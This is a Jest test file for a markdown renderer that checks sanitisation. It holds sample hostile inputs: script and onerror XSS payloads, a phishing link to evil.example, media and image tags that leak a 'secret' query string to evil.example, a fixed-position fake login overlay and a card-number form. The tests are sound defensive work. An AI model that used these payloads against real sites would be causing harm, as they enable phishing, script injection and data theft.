import { renderMarkdown, markdownToText } from '../../src/utils/markdown';

const TABLE =
  'Here is how they compare:\n\n| Feature | A | B |\n|---|---|---|\n| Price | $10 | $20 |';

describe('renderMarkdown', () => {
  it('renders bold, links and lists', () => {
    const html = renderMarkdown('**Bold** [link](/guide)\n\n- one\n- two');
    expect(html).toContain('<strong>Bold</strong>');
    expect(html).toContain('<a href="/guide">link</a>');
    expect(html).toContain('<ul>');
  });

  it('renders a table that keyboard users can focus', () => {
    const html = renderMarkdown(TABLE);
    expect(html).toContain('<table tabindex="0">');
    expect(html).toContain('<th>Feature</th>');
    expect(html).toContain('<td>$20</td>');
  });

  it('renders a table that follows a sentence after a single newline', () => {
    expect(renderMarkdown('Compare:\n| a | b |\n|---|---|\n| 1 | 2 |')).toContain('<table');
  });

  it('strips scripts and event handlers', () => {
    const html = renderMarkdown('<script>alert(1)</script><img src="x.jpg" onerror="alert(1)">');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
  });

  it('keeps links to this site, its subdomains, email and phone', () => {
    // jsdom serves the tests from http://localhost/
    const html = renderMarkdown(
      '[a](/care) [b](http://localhost/x) [c](https://shop.localhost/y) [d](mailto:help@shop.com) [e](tel:123)',
    );
    expect(html.match(/<a /g)).toHaveLength(5);
  });

  it('turns links with other schemes into plain text, even to this host', () => {
    const html = renderMarkdown('[Text us](sms:+15551234567) [files](ftp://localhost/f)');
    expect(html).not.toContain('<a');
    expect(html).toContain('Text us');
    expect(html).toContain('files');
  });

  it('turns links to other sites into plain text', () => {
    const html = renderMarkdown(
      'Verify your order at [our portal](https://evil.example/login) now.',
    );
    expect(html).not.toContain('<a');
    expect(html).not.toContain('evil.example');
    expect(html).toContain('Verify your order at our portal now.');
  });

  it('strips images, so a crafted image URL cannot leak data', () => {
    const html = renderMarkdown(
      'Hi ![x](https://evil.example/p.png?q=secret) <img src="https://evil.example/a.png">',
    );
    expect(html).not.toContain('<img');
    expect(html).toContain('Hi');
  });

  it('strips style attributes', () => {
    const html = renderMarkdown('<div style="position:fixed;inset:0">Log in</div>');
    expect(html).not.toContain('style=');
    expect(html).toContain('Log in');
  });

  it('strips other tags that load a URL with no click, and form controls', () => {
    const html = renderMarkdown(
      [
        '<video poster="https://evil.example/v.png?q=secret"></video>',
        '<audio src="https://evil.example/a.mp3"></audio>',
        '<video><source src="https://evil.example/s.mp4"></video>',
        '<table background="https://evil.example/t.png"><tr><td background="https://evil.example/td.png">x</td></tr></table>',
        '<svg><image href="https://evil.example/i.png"></image></svg>',
        '<input type="image" src="https://evil.example/in.png">',
        '<input placeholder="Enter your card number"><button>Pay</button>',
      ].join('\n'),
    );
    expect(html).not.toContain('evil.example');
    ['<video', '<audio', '<source', '<svg', '<input', '<button'].forEach((tag) =>
      expect(html).not.toContain(tag),
    );
  });

  it('returns an empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('');
  });
});

describe('markdownToText', () => {
  it('drops markdown syntax and keeps table cells apart', () => {
    expect(markdownToText(`**Hi** there\n\n${TABLE}`)).toBe(
      'Hi there Here is how they compare: Feature A B Price $10 $20',
    );
  });
});
